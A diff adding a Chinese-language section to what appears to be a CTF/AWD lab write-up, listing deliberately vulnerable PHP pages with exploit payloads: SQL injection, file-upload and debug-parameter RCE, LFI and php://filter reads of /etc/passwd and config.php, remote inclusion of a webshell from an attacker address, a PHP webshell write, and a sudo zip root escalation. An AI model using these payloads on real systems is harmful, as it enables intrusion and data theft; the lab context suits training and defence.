@@ -48,6 +48,60 @@
     ```
     xxxxxxxx 将是 admin 用户的密码
 
+## Web PHP 代码漏洞
+-   login.php: SQL 注入漏洞
+```
+POST /login.php
+username=admin' -- -&password=anything
+```
+
+-   dashboard.php: 文件上传漏洞
+```
+POST /dashboard.php HTTP/1.1
+这里是没有检查文件类型，并且可以执行上传的 php 代码。 
+```
+
+-   game.php: LFI 漏洞
+```
+/games.php?game=../../etc/passwd 
+/games.php?game=php://filter/convert.base64-encode/resource=config.php
+结合 php://filter-chains 技术可实现 RCE /games.php?game=(php://filter-chains链)
+推荐项目: 
+https://github.com/synacktiv/php_filter_chain_generator.git
+https://github.com/DingTom23/php-reverse-chains.git
+```
+
+-   ball.php: RCE 漏洞
+```
+/ball.php?debug=1&cmd=id
+```
+
+-   memory.php: Remote LFI 漏洞
+```
+/memory.php?theme=http://youraddress/webshell.php
+```
+
+-   puzzle.php: SQL 注入漏洞
+```
+/puzzle.php?check_username=admin' OR '1'='1
+/puzzle.php?check_username=admin' UNION SELECT 1,2,3,4,5,6 FROM information_schema.tables WHERE '1'='1
+```
+
+-   snake.php: 文件读写漏洞
+```
+读取文件: /snake.php?admin=super&file=/etc/passwd
+写入文件: 
+POST /snake.php?admin=super
+Content-Type: application/x-www-form-urlencoded
+
+filename=shell.php&content=<?php system($_GET['cmd']); ?>
+```
+
+-   typing.php: PHP伪协议漏洞
+```
+/typing.php?load_wordlist=php://filter/convert.base64-encode/resource=config.php
+```
+
 ## `welcome` 用户密码复用
 
 -   `welcome` 用户的 Linux 登录密码与其用户名相同，均为 `welcome`。
@@ -105,7 +159,7 @@ uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),100
 welcome@dmsy-awd:~$ TF=$(mktemp -u)
 welcome@dmsy-awd:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
   adding: etc/hosts (deflated 31%)
-\# id
+# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
